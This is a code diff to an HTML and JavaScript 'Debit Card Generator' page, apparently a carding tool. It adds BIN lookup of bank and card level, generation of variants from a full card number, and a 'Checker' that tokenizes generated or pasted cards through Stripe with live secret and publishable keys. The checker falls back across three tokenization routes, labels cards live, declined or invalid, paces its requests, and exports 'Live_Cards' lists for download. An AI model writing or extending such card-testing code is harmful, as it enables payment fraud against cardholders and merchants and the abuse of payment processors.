@@ -5,6 +5,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Debit Card Generator</title>
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#1f2937">
+    <!-- Stripe.js Script -->
+    <script src="https://js.stripe.com/v3/"></script>
     <style>
         :root {
             --primary: #D4AF37;
@@ -503,11 +507,38 @@
         <!-- Tab 1: Generation -->
         <div id="tab1" class="tab-content active">
             <div class="form-group">
-                <label data-i18n="label_bin">BIN / First Digits (6-12 digits)</label>
+                <label data-i18n="label_bin">BIN / Prefix (6-15 digits)</label>
                 <div class="input-with-icon">
-                    <input type="text" id="binInput" value="424242" placeholder="Enter first 6-12 digits"
-                        data-i18n-placeholder="placeholder_bin" oninput="detectBrand(this.value)">
+                    <input type="text" id="binInput" value="424242" placeholder="0000 0000 0000 0000"
+                        data-i18n-placeholder="placeholder_bin" oninput="handleBinInput(this)">
                     <span id="brandIcon" class="card-brand-icon"></span>
+                </div>
+            </div>
+
+            <!-- BIN Details Box -->
+            <div id="binDetails"
+                style="margin-bottom: 20px; padding: 15px; background: #1a1a1a; border: 1px solid var(--border); border-radius: 6px; display: none;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                    <span style="color: var(--primary); font-weight: bold; font-size: 0.9em;">CARD INFO</span>
+                    <span id="binCountryFlag" style="font-size: 1.5em;"></span>
+                </div>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 0.9em;">
+                    <div>
+                        <span style="color: var(--text-light);">Bank:</span> <br>
+                        <span id="binBank" style="color: #fff;">-</span>
+                    </div>
+                    <div>
+                        <span style="color: var(--text-light);">Country:</span> <br>
+                        <span id="binCountry" style="color: #fff;">-</span>
+                    </div>
+                    <div>
+                        <span style="color: var(--text-light);">Type:</span> <br>
+                        <span id="binType" style="color: #fff;">-</span>
+                    </div>
+                    <div>
+                        <span style="color: var(--text-light);">Level:</span> <br>
+                        <span id="binLevel" style="color: #fff;">-</span>
+                    </div>
                 </div>
             </div>
 
@@ -572,8 +603,14 @@
 
         <!-- Tab 2: Active Cards Simulation -->
         <div id="tab2" class="tab-content">
-            <button class="action-btn" onclick="loadActiveCards()" data-i18n="btn_load_active">Load Active Cards (API
-                Mock)</button>
+            <div style="margin-bottom: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+                <button class="action-btn" style="flex:1" onclick="loadActiveCards()" data-i18n="btn_refresh">Refresh
+                    List</button>
+                <button class="action-btn" style="flex:1; background: #333; color: white;" onclick="copyActiveCards()"
+                    data-i18n="btn_copy">Copy</button>
+                <button class="action-btn" style="flex:1; background: #333; color: white;"
+                    onclick="downloadActiveCards()" data-i18n="btn_download">Download .txt</button>
+            </div>
             <table id="activeTable">
                 <thead>
                     <tr>
@@ -692,8 +729,8 @@
                 tab_active: "Active Cards",
                 tab_check: "Checker",
                 tab_settings: "Settings",
-                label_bin: "BIN / First Digits (6-12 digits)",
-                placeholder_bin: "Enter first 6-12 digits",
+                label_bin: "BIN / Prefix (6-15 digits)",
+                placeholder_bin: "0000 0000 0000 0000",
                 label_month: "Month (MM)",
                 label_year: "Year (YY)",
                 label_cvv: "CVV (Optional)",
@@ -722,11 +759,16 @@
                 val_random: "Random",
                 msg_no_active: "No verified active cards yet. Run the Checker to find live cards.",
                 luhn_passed: "Luhn Check Passed",
-                msg_invalid_bin: "Please enter a valid BIN (6-12 digits).",
+                msg_invalid_bin: "Please enter a valid BIN/Prefix (6-15 digits).",
                 msg_select_card: "Please select at least one card to send to Checker.",
                 label_paypal: "PayPal API",
                 label_mastercard: "MasterCard API",
-                btn_check_key: "Check"
+                btn_check_key: "Check",
+                btn_refresh: "Refresh List",
+                btn_copy: "Copy",
+                btn_download: "Download .txt",
+                msg_copied: "Copied to clipboard!",
+                msg_downloaded: "List downloaded."
             },
             ar: {
                 title: "مولد بطاقات الخصم",
@@ -735,8 +777,8 @@
                 tab_active: "البطاقات النشطة",
                 tab_check: "الفاحص",
                 tab_settings: "الإعدادات",
-                label_bin: "BIN / الأرقام الأولى (6-12 رقم)",
-                placeholder_bin: "أدخل أول 6-12 أرقام",
+                label_bin: "BIN / البادئة (6-15 رقم)",
+                placeholder_bin: "0000 0000 0000 0000",
                 label_month: "الشهر (MM)",
                 label_year: "السنة (YY)",
                 label_cvv: "CVV (اختياري)",
@@ -765,11 +807,16 @@
                 val_random: "عشوائي",
                 msg_no_active: "لا توجد بطاقات نشطة مؤكدة بعد. شغل الفاحص للعثور على بطاقات حية.",
                 luhn_passed: "اجتاز فحص Luhn",
-                msg_invalid_bin: "الرجاء إدخال BIN صحيح (6-12 رقم).",
+                msg_invalid_bin: "الرجاء إدخال BIN/بادئة صحيحة (6-15 رقم).",
                 msg_select_card: "الرجاء تحديد بطاقة واحدة على الأقل للإرسال للفحص.",
                 label_paypal: "PayPal API",
                 label_mastercard: "MasterCard API",
-                btn_check_key: "فحص"
+                btn_check_key: "فحص",
+                btn_refresh: "تحديث القائمة",
+                btn_copy: "نسخ",
+                btn_download: "تحميل .txt",
+                msg_copied: "تم النسخ للحافظة!",
+                msg_downloaded: "تم تحميل القائمة."
             },
             zh: {
                 title: "借记卡生成器",
@@ -779,7 +826,7 @@
                 tab_check: "检查器",
                 tab_settings: "设置",
                 label_bin: "BIN / 前几位 (6-12位)",
-                placeholder_bin: "输入前 6-12 位数字",
+                placeholder_bin: "0000 0000 0000 0000",
                 label_month: "月份 (MM)",
                 label_year: "年份 (YY)",
                 label_cvv: "CVV (可选)",
@@ -809,7 +856,12 @@
                 msg_no_active: "尚无验证的活跃卡片。运行检查器以查找有效卡片。",
                 luhn_passed: "Luhn 校验通过",
                 msg_invalid_bin: "请输入有效的 BIN (6-12位数字)。",
-                msg_select_card: "请至少选择一张卡片发送到检查器。"
+                msg_select_card: "请至少选择一张卡片发送到检查器。",
+                btn_refresh: "刷新列表",
+                btn_copy: "复制",
+                btn_download: "下载 .txt",
+                msg_copied: "已复制到剪贴板！",
+                msg_downloaded: "列表已下载。"
             },
             tr: {
                 title: "Banka Kartı Oluşturucu",
@@ -819,7 +871,7 @@
                 tab_check: "Kontrolcü",
                 tab_settings: "Ayarlar",
                 label_bin: "BIN / İlk Rakamlar (6-12 hane)",
-                placeholder_bin: "İlk 6-12 rakamı girin",
+                placeholder_bin: "0000 0000 0000 0000",
                 label_month: "Ay (AA)",
                 label_year: "Yıl (YY)",
                 label_cvv: "CVV (İsteğe bağlı)",
@@ -849,7 +901,12 @@
                 msg_no_active: "Henüz doğrulanmış aktif kart yok. Canlı kartları bulmak için Kontrolcüyü çalıştırın.",
                 luhn_passed: "Luhn Kontrolü Başarılı",
                 msg_invalid_bin: "Lütfen geçerli bir BIN girin (6-12 hane).",
-                msg_select_card: "Lütfen kontrolcüye göndermek için en az bir kart seçin."
+                msg_select_card: "Lütfen kontrolcüye göndermek için en az bir kart seçin.",
+                btn_refresh: "Listeyi Yenile",
+                btn_copy: "Kopyala",
+                btn_download: "İndir .txt",
+                msg_copied: "Pano kopyalandı!",
+                msg_downloaded: "Liste indirildi."
             },
             ru: {
                 title: "Генератор Дебетовых Карт",
@@ -859,7 +916,7 @@
                 tab_check: "Проверка",
                 tab_settings: "Настройки",
                 label_bin: "BIN / Первые Цифры (6-12 цифр)",
-                placeholder_bin: "Введите первые 6-12 цифр",
+                placeholder_bin: "0000 0000 0000 0000",
                 label_month: "Месяц (MM)",
                 label_year: "Год (YY)",
                 label_cvv: "CVV (Необязательно)",
@@ -887,7 +944,12 @@
                 msg_saved: "Настройки Успешно Сохранены!",
                 val_random: "Случайно",
                 msg_no_active: "Пока нет подтвержденных активных карт. Запустите Проверку, чтобы найти живые карты.",
-                luhn_passed: "Проверка Luhn Пройдена"
+                luhn_passed: "Проверка Luhn Пройдена",
+                btn_refresh: "Обновить Список",
+                btn_copy: "Копировать",
+                btn_download: "Скачать .txt",
+                msg_copied: "Скопировано в буфер обмена!",
+                msg_downloaded: "Список скачан."
             }
         };
 
@@ -1017,7 +1079,7 @@
                 displayField.style.color = "var(--primary)";
                 displayField.style.fontWeight = "bold";
             } else {
-                displayField.value = "sk_live_simulation_key_...";
+                displayField.value = "Not Configured";
                 displayField.style.color = "#64748b";
                 displayField.style.fontWeight = "normal";
             }
@@ -1027,10 +1089,89 @@
         window.addEventListener('DOMContentLoaded', () => {
             loadSettings();
             // Trigger brand detection on load
-            detectBrand(document.getElementById('binInput').value);
+            const binInput = document.getElementById('binInput');
+            handleBinInput(binInput); // Format initial value
         });
 
         // === Logic: Brand Detection & API Verification ===
+        let binLookupTimeout;
+
+        function handleBinInput(input) {
+            let value = input.value.replace(/\D/g, ''); // Remove non-digits
+
+            // Limit to 16 digits
+            if (value.length > 16) value = value.slice(0, 16);
+
+            // Format with spaces
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+
+            // Only update if changed to avoid cursor jumping issues (basic implementation)
+            if (input.value !== formatted) {
+                input.value = formatted;
+            }
+
+            detectBrand(value);
+
+            // BIN Lookup Trigger
+            clearTimeout(binLookupTimeout);
+            if (value.length >= 6) {
+                binLookupTimeout = setTimeout(() => {
+                    fetchBinDetails(value.substring(0, 8)); // Use first 6-8 digits
+                }, 500); // 500ms debounce
+            } else {
+                document.getElementById('binDetails').style.display = 'none';
+            }
+        }
+
+        async function fetchBinDetails(bin) {
+            const detailsBox = document.getElementById('binDetails');
+            const bankEl = document.getElementById('binBank');
+            const countryEl = document.getElementById('binCountry');
+            const typeEl = document.getElementById('binType');
+            const levelEl = document.getElementById('binLevel');
+            const flagEl = document.getElementById('binCountryFlag');
+
+            try {
+                // Show loading state
+                detailsBox.style.display = 'block';
+                bankEl.innerText = 'Loading...';
+                countryEl.innerText = '...';
+                flagEl.innerText = '';
+                typeEl.innerText = '...';
+                levelEl.innerText = '...';
+
+                const response = await fetch(`/api/lookup/${bin}`);
+                const result = await response.json();
+
+                if (result.success && result.found) {
+                    const data = result.data;
+                    bankEl.innerText = data.bank ? data.bank.name : 'N/A';
+                    countryEl.innerText = data.country ? data.country.name : 'N/A';
+                    flagEl.innerText = data.country ? data.country.emoji : '';
+                    typeEl.innerText = (data.scheme || '') + ' ' + (data.type || '');
+                    levelEl.innerText = data.brand || 'N/A';
+                } else {
+                    // Handle specific errors like Rate Limiting
+                    if (result.message && (result.message.includes('Too Many Requests') || result.message.includes('429'))) {
+                        bankEl.innerText = 'Limit Reached';
+                        countryEl.innerText = 'Try later';
+                    } else {
+                        bankEl.innerText = 'Unknown';
+                        countryEl.innerText = 'Unknown';
+                    }
+                    flagEl.innerText = '';
+                    typeEl.innerText = '-';
+                    levelEl.innerText = '-';
+                }
+            } catch (error) {
+                console.error('BIN Lookup Error:', error);
+            }
+        }
+
         function detectBrand(bin) {
             const iconSpan = document.getElementById('brandIcon');
             iconSpan.className = 'card-brand-icon'; // Reset
@@ -1206,7 +1347,8 @@
         }
 
         function generateCards() {
-            const bin = document.getElementById('binInput').value.trim();
+            const rawBin = document.getElementById('binInput').value;
+            let bin = rawBin.replace(/\s+/g, '').trim(); // Remove spaces for logic
             const qty = parseInt(document.getElementById('qtyInput').value);
             const outputDiv = document.getElementById('genOutputFormatted');
 
@@ -1215,9 +1357,24 @@
             const selYear = document.getElementById('yearInput').value;
             const customCvv = document.getElementById('cvvInput').value.trim();
 
-            if (!/^\d{6,12}$/.test(bin)) {
-                alert("Please enter a valid BIN (6-12 digits).");
+            // Allow 16 digits but process them
+            if (!/^\d{6,16}$/.test(bin)) {
+                alert(translations[currentLang].msg_invalid_bin);
                 return;
+            }
+
+            // Smart Truncation Logic
+            // If user provides full card (16) or near full (15) and wants multiple cards,
+            // we assume they want variations, so we cut back to 14 digits to allow the 15th to vary.
+            if (qty > 1) {
+                if (bin.length >= 15) {
+                    bin = bin.substring(0, 14);
+                }
+            } else {
+                // If qty is 1, we just ensure we have room for the checksum
+                if (bin.length === 16) {
+                    bin = bin.substring(0, 15);
+                }
             }
 
             generatedCardsList = [];
@@ -1229,7 +1386,10 @@
                 // Target length 16. Payload length 15.
                 // Random digits needed = 15 - bin.length
                 let randomPart = "";
-                for (let j = 0; j < (15 - bin.length); j++) {
+                let needed = 15 - bin.length;
+                if (needed < 0) needed = 0;
+
+                for (let j = 0; j < needed; j++) {
                     randomPart += Math.floor(Math.random() * 10);
                 }
 
@@ -1328,18 +1488,61 @@
             });
         }
 
+        function copyActiveCards() {
+            if (activeCardsList.length === 0) {
+                alert(translations[currentLang].msg_no_active);
+                return;
+            }
+            const text = activeCardsList.join('\n');
+            navigator.clipboard.writeText(text).then(() => {
+                showToast(translations[currentLang].msg_copied, 'success');
+            }).catch(err => {
+                showToast('Failed to copy', 'error');
+            });
+        }
+
+        function downloadActiveCards() {
+            if (activeCardsList.length === 0) {
+                alert(translations[currentLang].msg_no_active);
+                return;
+            }
+            const text = activeCardsList.join('\n');
+            const blob = new Blob([text], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `Live_Cards_${new Date().toISOString().slice(0, 10)}.txt`;
+            a.click();
+            window.URL.revokeObjectURL(url);
+            showToast(translations[currentLang].msg_downloaded, 'success');
+        }
+
         // === Logic: Checker (Real Stripe API) ===
         async function startChecker() {
             const input = document.getElementById('checkInput').value.trim();
             const log = document.getElementById('checkLog');
             const secretKey = localStorage.getItem('syriaPay_sk');
+            const publishableKey = localStorage.getItem('syriaPay_pk');
 
             log.innerHTML = "";
+
+            // Check Internet Connection
+            if (!navigator.onLine) {
+                log.innerHTML = `<span class="log-die" style="font-size:1.1em; display:block; padding:10px; border:1px solid var(--danger);">⚠ Error: No Internet Connection.<br>Checking cards requires an active internet connection to contact Stripe.</span>`;
+                return;
+            }
 
             if (!secretKey || !secretKey.startsWith('sk_')) {
                 log.innerHTML = `<span class="log-die">Error: Missing or Invalid Secret Key. Please go to Settings and enter a valid sk_live_... key.</span>`;
                 return;
             }
+            if (!publishableKey || !publishableKey.startsWith('pk_')) {
+                log.innerHTML = `<span class="log-die">Error: Missing or Invalid Publishable Key. Please go to Settings and enter a valid pk_live_... key for Tokenization.</span>`;
+                return;
+            }
+
+            // Initialize Stripe.js with the provided Publishable Key
+            const stripe = Stripe(publishableKey);
 
             let lines = input ? input.split('\n') : generatedCardsList;
             if (lines.length === 0) {
@@ -1354,7 +1557,7 @@
                 // Log checking
                 const entry = document.createElement('div');
                 entry.className = 'log-entry';
-                entry.innerText = `Checking ${line}...`;
+                entry.innerText = `Tokenizing ${line}...`;
                 log.appendChild(entry);
                 log.scrollTop = log.scrollHeight;
 
@@ -1365,25 +1568,120 @@
                     continue;
                 }
 
-                const cardNumber = parts[0];
-                const exp = parts[1].split('/'); // MM/YYYY or MM/YY
-                let expMonth = exp[0];
-                let expYear = exp[1];
+                const cardNumber = parts[0].trim();
+                const expRaw = parts[1].trim();
+                const cvv = parts[2] ? parts[2].trim() : "";
+
+                let expMonth, expYear;
+                if (expRaw.includes('/')) {
+                    const expParts = expRaw.split('/');
+                    expMonth = expParts[0].trim();
+                    expYear = expParts[1] ? expParts[1].trim() : "";
+                } else {
+                    entry.innerHTML = `<span class="log-die">[INVALID DATE FORMAT]</span> ${line}`;
+                    continue;
+                }
+
+                if (!expYear || !expMonth) {
+                    entry.innerHTML = `<span class="log-die">[INVALID DATE]</span> ${line}`;
+                    continue;
+                }
+
                 if (expYear.length === 2) expYear = "20" + expYear;
-                const cvv = parts[2];
+
+                // Robust Tokenization Chain
+                let payload = { secretKey };
+                let tokenizationSuccess = false;
+                let errorMessage = "";
+
+                // Attempt 1: createPaymentMethod (Modern)
+                try {
+                    const pmResult = await stripe.createPaymentMethod({
+                        type: 'card',
+                        card: { number: cardNumber, exp_month: expMonth, exp_year: expYear, cvc: cvv },
+                    });
+                    if (pmResult.paymentMethod) {
+                        payload.paymentMethodId = pmResult.paymentMethod.id;
+                        entry.innerText = `Checking ${cardNumber} (Via PM)...`;
+                        tokenizationSuccess = true;
+                    } else {
+                        errorMessage = pmResult.error.message;
+                    }
+                } catch (e) {
+                    errorMessage = e.message;
+                }
+
+                // Attempt 2: createToken (Legacy JS) - Only if PM failed
+                if (!tokenizationSuccess) {
+                    try {
+                        // Note: createToken('card') might throw "Invalid value for token type" if 'card' isn't supported
+                        // by the loaded Stripe.js version/config without Elements. We catch this to fallback.
+                        const tokenResult = await stripe.createToken('card', {
+                            number: cardNumber, exp_month: expMonth, exp_year: expYear, cvc: cvv
+                        });
+
+                        if (tokenResult.token) {
+                            payload.token = tokenResult.token.id;
+                            entry.innerText = `Checking ${cardNumber} (Via Token)...`;
+                            tokenizationSuccess = true;
+                        } else {
+                            errorMessage = tokenResult.error.message;
+                        }
+                    } catch (e) {
+                        errorMessage = e.message; // Capture the "Invalid value..." error
+                    }
+                }
+
+                // Attempt 3: Direct API Call (Last Resort) - If JS SDK fails
+                if (!tokenizationSuccess) {
+                    try {
+                        const body = new URLSearchParams();
+                        body.append('card[number]', cardNumber);
+                        body.append('card[exp_month]', expMonth);
+                        body.append('card[exp_year]', expYear);
+                        body.append('card[cvc]', cvv);
+
+                        const directResp = await fetch('https://api.stripe.com/v1/tokens', {
+                            method: 'POST',
+                            headers: {
+                                'Authorization': 'Bearer ' + publishableKey,
+                                'Content-Type': 'application/x-www-form-urlencoded'
+                            },
+                            body: body
+                        });
+
+                        const directData = await directResp.json();
+
+                        if (directData.id) {
+                            payload.token = directData.id;
+                            entry.innerText = `Checking ${cardNumber} (Via Direct API)...`;
+                            tokenizationSuccess = true;
+                        } else {
+                            errorMessage = directData.error ? directData.error.message : "Unknown API Error";
+                        }
+                    } catch (directErr) {
+                        errorMessage = "Direct API Network Error: " + directErr.message;
+                    }
+                }
+
+                // If all attempts failed
+                if (!tokenizationSuccess) {
+                    // Enhance error message for common issues
+                    if (errorMessage.includes('Invalid value for token type') || errorMessage.includes('You specified: card')) {
+                        errorMessage = `<span style="color:#ef4444; font-weight:bold;">Restricted Key Error:</span> This Publishable Key is not allowed to send raw card numbers. <br><span style="color:#aaa; font-size:0.9em;">(Stripe requires 'Handle Card Data Directly' permission for this. Use a key with permissions or use Stripe Elements.)</span>`;
+                    } else if (errorMessage.includes('Stripe Elements')) {
+                        errorMessage += ` <br><span style="color:#aaa; font-size:0.8em;">(This key requires Stripe Elements or Direct API access)</span>`;
+                    }
+                    entry.innerHTML = `<span class="log-die">[TOKEN_ERROR]</span> ${line} - ${errorMessage}`;
+                    continue;
+                }
 
                 try {
-                    // Call Local Backend
+                    // 2. Send ID to Backend
                     const response = await fetch('/api/check-card', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            cardNumber,
-                            expMonth,
-                            expYear,
-                            cvv,
-                            secretKey
-                        })
+                        body: JSON.stringify(payload)
                     });
 
                     const data = await response.json();
@@ -1394,12 +1692,21 @@
                             activeCardsList.push(line);
                         }
                     } else {
-                        entry.innerHTML = `<span class="log-die">[DIE]</span> ${line} - ${data.message}`;
+                        // Distinguish errors
+                        if (data.code === 'incorrect_number' || data.code === 'invalid_number') {
+                            entry.innerHTML = `<span class="log-die" style="color:var(--text-light); border-color:var(--text-light);">[INVALID]</span> ${line} - Card Number Not Exist`;
+                        } else if (data.code === 'card_declined') {
+                            entry.innerHTML = `<span class="log-die">[DECLINED]</span> ${line} - ${data.message}`;
+                        } else {
+                            entry.innerHTML = `<span class="log-die">[DIE]</span> ${line} - ${data.message}`;
+                        }
                     }
-
                 } catch (err) {
-                    entry.innerHTML = `<span class="log-die">[ERROR]</span> ${line} - Connection Failed: ${err.message}`;
+                    entry.innerHTML = `<span class="log-die">[ERROR]</span> ${line} - Backend Connection Failed: ${err.message}`;
                 }
+
+                // Rate Limit Delay
+                await new Promise(r => setTimeout(r, 1000));
             }
         }
     </script>
